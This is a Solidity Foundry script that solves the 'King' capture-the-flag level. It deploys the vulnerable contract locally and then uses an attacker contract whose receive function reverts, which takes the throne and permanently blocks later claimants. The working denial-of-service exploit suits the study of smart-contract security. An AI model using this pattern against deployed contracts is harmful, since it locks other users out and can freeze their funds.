// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

contract KingSolution is Script {
    // $ forge script script/King.s.sol --tc KingSolution

    function run() external {
        address deployer = makeAddr("deployer");
        vm.deal(deployer, 1 ether);
        vm.startPrank(deployer);
        King kingInstance = new King{value: 0.1 ether}();
        vm.stopPrank();

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - In `King` contract, you can become the king if you pay with an amount greater than the paid amount of the old king.
        // - When a new king makes a request, the contract transfers the old king ether back, and updates `king` and `prize` variables to the caller data (new king).
        // - If the old king can't accept ether, the tx will revert and no one will be able to overthrow the current king.
        // - We will make a smart contract that doesn't accept receiving ETH, then pay with an amount greater than the old king's amount to become the king.
        // - In the contract, which is the king at this moment, will implement a receive function with a revert statement.
        // - So if a new address wants to become the new king, the refunding process will revert, and no one will be able to take the king position.

        KingAttack attackContract = new KingAttack(payable(address(kingInstance)));
        console.log("King:", kingInstance._king()); // The attacker became the new king
        console.log("Attacking...");
        attackContract.attack{value: 0.2 ether}(); // The attacker sends more price and became the king
        console.log("King:", kingInstance._king()); // The attacker became the new king

        vm.stopPrank();

        // Now if anyone wants to become the new king, it will fail
        // Testing becoming the newKing after attacker...

        address newPlayer = makeAddr("player");
        vm.deal(newPlayer, 1 ether);
        vm.startPrank(newPlayer);

        console.log("newPlayer(", newPlayer, ") is trying to become the new king...");
        (bool success,) = payable(address(kingInstance)).call{value: 0.3 ether}("");
        if (!success) {
            console.log("Failed to become the new king");
            console.log("King:", kingInstance._king()); // The attacker is still the current king
        }
        vm.stopPrank();
    }
}

contract KingAttack {
    King kingInstance;

    constructor(address payable target) {
        kingInstance = King(target);
    }

    receive() external payable {
        revert("You can't be the king");
    }

    function attack() public payable {
        if (msg.value > kingInstance.prize()) {
            (bool success,) = payable(address(kingInstance)).call{value: msg.value}("");
            require(success);
        }
    }
}
